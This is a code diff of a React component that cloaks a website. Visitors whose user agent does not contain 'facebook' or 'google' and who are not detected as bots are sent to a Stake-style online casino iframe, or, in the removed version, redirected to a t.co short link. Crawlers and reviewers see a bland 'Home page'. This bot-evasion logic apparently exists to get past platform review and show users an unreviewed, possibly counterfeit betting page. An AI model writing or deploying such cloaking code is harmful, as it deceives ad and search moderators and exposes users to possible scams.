@@ -8,7 +8,7 @@ function NotFound() {
   let[countryCode, setCountryCode] = useState('');
   let[IsUserHiden, SetUserHiden] = useState(false);
   let[IframeUrl, SetIframeUrl] = useState('https://newclient-nu.vercel.app/');
-  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Stake: Online Casino & Sports Betting - Play & Bet Online');
+  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Home page');
   let[SiteTitleHome, SetSiteTitleHome] = useState('Home page');
 
 
@@ -74,13 +74,12 @@ function NotFound() {
   useEffect(() => {
     //setLocaltion();
   }, []);
-  return(showIframe("/id/home.html",SiteTitleHome,false));
   const userAgent = navigator.userAgent.toLowerCase();
   if(!userAgent.includes('facebook') 
     && !userAgent.includes('google') 
     && !isbot(userAgent)){
-      return window.location.href = 'https://t.co/eTzKSTCwng';
-      //return(showIframe("/stake/index.html",SiteTitleMeta,false));
+      //return window.location.href = 'https://t.co/eTzKSTCwng';
+      return(showIframe("/stake/index.html",SiteTitleMeta,false));
     // if(IsUserHiden){
     //   return(showIframe("/id/home.html",SiteTitleHome,false));
     // }else{
